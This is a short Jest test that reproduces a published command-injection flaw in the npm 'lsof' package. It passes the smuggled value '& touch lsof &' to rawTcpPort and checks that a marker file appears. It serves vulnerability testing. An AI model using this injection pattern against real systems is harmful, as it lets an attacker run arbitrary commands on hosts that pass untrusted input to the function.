//https://snyk.io/vuln/SNYK-JS-LSOF-543632
test("Command Injection in lsof", () => {
  const root = require("lsof");
  const fs = require("fs");
  const path = "./lsof";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let attack_code = "& touch lsof &";
  root.rawTcpPort(attack_code, function () {});
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
